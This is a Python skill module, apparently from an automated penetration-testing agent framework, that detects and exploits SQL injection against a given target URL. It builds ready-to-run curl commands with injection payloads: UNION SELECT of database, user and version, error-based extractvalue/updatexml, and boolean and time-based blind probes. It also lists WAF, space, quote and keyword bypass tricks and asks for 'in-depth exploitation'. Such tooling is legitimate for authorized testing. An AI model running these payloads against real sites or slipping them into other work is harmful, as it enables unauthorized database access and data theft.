from typing import Dict, Any
from ..base import Skill, SkillCategory, SkillResult
from ..decorators import register_skill

@register_skill
class SQLInjectionSkill(Skill):
    """
    SQL注入检测与利用技能
    """

    def __init__(self):
        super().__init__()
        self.id = "web_sqli"
        self.name = "SQL注入检测与利用"
        self.category = SkillCategory.WEB
        self.description = "检测目标是否存在SQL注入漏洞，并尝试利用获取数据"
        self.prerequisites = ["target_url"]
        self.tools_required = ["execute_shell"]
        self.difficulty = "medium"

    def execute(self, context: Dict[str, Any], executor: Any) -> SkillResult:
        """
        执行SQL注入检测与利用，注意参数视具体情况而定

        步骤：
        1. 基础注入点检测（单引号、双引号）
        2. 判断注入类型（数字型、字符型、搜索型）
        3. 判断数据库类型
        4. 尝试联合查询注入
        5. 尝试报错注入
        6. 尝试布尔盲注
        7. 尝试时间盲注
        """
        # 检查前置条件
        ok, msg = self.check_prerequisites(context)
        if not ok:
            return SkillResult(success=False, message=msg)

        target_url = context["target_url"]
        commands = []
        findings = []

        # 1. 基础检测 - 单引号测试
        cmd1 = f"curl -s \"{target_url}'\""
        commands.append(cmd1)
        findings.append("步骤1: 测试单引号注入点")

        # 2. 判断注入类型
        # 数字型: id=1 and 1=1
        # 字符型: id=1' and '1'='1
        cmd2 = f"curl -s \"{target_url} and 1=1\""
        cmd3 = f"curl -s \"{target_url}' and '1'='1\""
        commands.extend([cmd2, cmd3])
        findings.append("步骤2: 判断注入类型（数字型/字符型）")

        # 3. 数据库类型判断
        # MySQL: version(), database()
        # PostgreSQL: version()
        # SQLite: sqlite_version()
        cmd4 = f"curl -s \"{target_url}' union select version()-- -\""
        commands.append(cmd4)
        findings.append("步骤3: 判断数据库类型")

        # 4. 联合查询注入
        # 判断列数
        cmd5 = f"curl -s \"{target_url}' order by 1-- -\""
        cmd6 = f"curl -s \"{target_url}' order by 2-- -\""
        cmd7 = f"curl -s \"{target_url}' order by 3-- -\""
        commands.extend([cmd5, cmd6, cmd7])
        findings.append("步骤4: 判断列数（order by）")

        # 联合查询获取数据
        cmd8 = f"curl -s \"{target_url}' union select 1,2,3-- -\""
        cmd9 = f"curl -s \"{target_url}' union select database(),user(),version()-- -\""
        commands.extend([cmd8, cmd9])
        findings.append("步骤5: 联合查询获取数据库信息")

        # 5. 报错注入
        cmd10 = f"curl -s \"{target_url}' and extractvalue(1,concat(0x7e,database()))-- -\""
        cmd11 = f"curl -s \"{target_url}' and updatexml(1,concat(0x7e,database()),1)-- -\""
        commands.extend([cmd10, cmd11])
        findings.append("步骤6: 尝试报错注入")

        # 6. 布尔盲注
        cmd12 = f"curl -s \"{target_url}' and length(database())>0-- -\""
        cmd13 = f"curl -s \"{target_url}' and ascii(substr(database(),1,1))>97-- -\""
        commands.extend([cmd12, cmd13])
        findings.append("步骤7: 尝试布尔盲注")

        # 7. 时间盲注
        cmd14 = f"curl -s \"{target_url}' and if(1=1,sleep(3),0)-- -\""
        commands.append(cmd14)
        findings.append("步骤8: 尝试时间盲注")

        # 构建执行建议
        message = f"""SQL注入检测技能已准备就绪

目标: {target_url}

建议执行步骤：
1. 基础注入点检测（单引号、双引号）
2. 判断注入类型（数字型/字符型/搜索型）
3. 判断数据库类型（MySQL/PostgreSQL/SQLite等）
4. 判断列数（order by）
5. 联合查询注入获取数据
6. 报错注入
7. 布尔盲注
8. 时间盲注

关键命令：
{chr(10).join(f'  {i+1}. {cmd}' for i, cmd in enumerate(commands[:5]))}
... 共{len(commands)}条命令

绕过技巧：
- WAF绕过: 使用/**/注释、大小写混淆、编码绕过
- 空格绕过: 使用/**/、%09、%0a、%0d、+等
- 引号绕过: 使用十六进制、char()函数
- 关键字绕过: 双写、内联注释

请安全专家逐步执行这些命令，根据响应判断注入类型并深入利用。如发现注入点，需报告[发现漏洞点]：漏洞触发点
"""

        return SkillResult(
            success=True,
            message=message,
            data={
                "target": target_url,
                "injection_types": ["union", "error", "boolean_blind", "time_blind"],
                "bypass_techniques": ["comment", "case", "encoding", "space_bypass"]
            },
            commands=commands,
            findings=findings
        )
